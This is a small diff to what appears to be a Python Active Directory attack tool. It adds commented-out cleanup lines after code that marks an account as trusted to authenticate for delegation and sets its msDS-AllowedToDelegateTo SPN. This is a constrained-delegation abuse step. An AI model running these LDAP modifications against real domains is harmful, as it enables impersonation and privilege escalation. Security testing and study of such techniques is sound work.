@@ -171,6 +171,10 @@ def main():
 
     ldap_session.modify(dn, {'userAccountControl': [ldap3.MODIFY_REPLACE, [16781312]]})  # WORKSTATION_TRUST_ACCOUNT | TRUSTED_TO_AUTH_FOR_DELEGATION
     ldap_session.modify(dn, {'msDS-AllowedToDelegateTo': [ldap3.MODIFY_REPLACE, [args.spn]]})
+    
+    # Cleanup
+    #ldap_session.modify(dn, {'msDS-AllowedToDelegateTo': [ldap3.MODIFY_REPLACE, []]})
+    #ldap_session.modify(dn, {'userAccountControl': [ldap3.MODIFY_REPLACE, [4096]]})  # WORKSTATION_TRUST_ACCOUNT
 
     if ldap_session.result['result'] == 0:
         logging.info('SPN successfully set!')
